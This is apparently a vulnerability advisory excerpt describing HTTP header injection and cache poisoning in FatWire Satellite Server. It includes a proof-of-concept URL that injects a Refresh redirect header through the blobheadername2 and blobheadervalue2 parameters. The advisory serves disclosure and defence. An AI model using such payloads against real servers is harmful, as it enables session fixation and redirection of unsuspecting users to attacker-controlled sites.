Vulnerability overview/description:
-----------------------------------
Due to unsanitized user input it is possible to inject arbitrary HTTP header
values in certain HTTP responses of the Satellite Server. This can be
exploited, for example, to perform session fixation and malicious redirection
attacks via the Set-Cookie and the Refresh headers. Moreover, the Satellite
Server caches these HTTP responses with the injected HTTP header resulting in
all further requests to the same resource being served with the poisoned HTTP
response, while these objects remain in cache.
 
 
Proof of concept:
-----------------
An arbitrary header can be injected in the HTTP responses of the
downloadable resources. The values of the blobheadername2 and the
blobheadervalue2 URL parameters are user controllable. In the following
example the Refresh header is injected:
 
http://fatwire/cs/Satellite?blobcol=urldata&blobheadername1=content-type&blobheadername2=Refresh&
blobheadervalue1=application/pdf&blobheadervalue2=0;url=http://www.sec-consult.com&blobkey=id&
blobnocache=false&blobtable=MungoBlobs&blobwhere=1342534304149&ssbinary=true&site=S08
 
The returned HTTP response will contain the injected Refresh header and its
value. Furthermore, the HTTP response will be cached, so the next time users
will be accessing the same downloadable resource using the standard URL, they
will be affected and redirected using the injected Refresh header value.
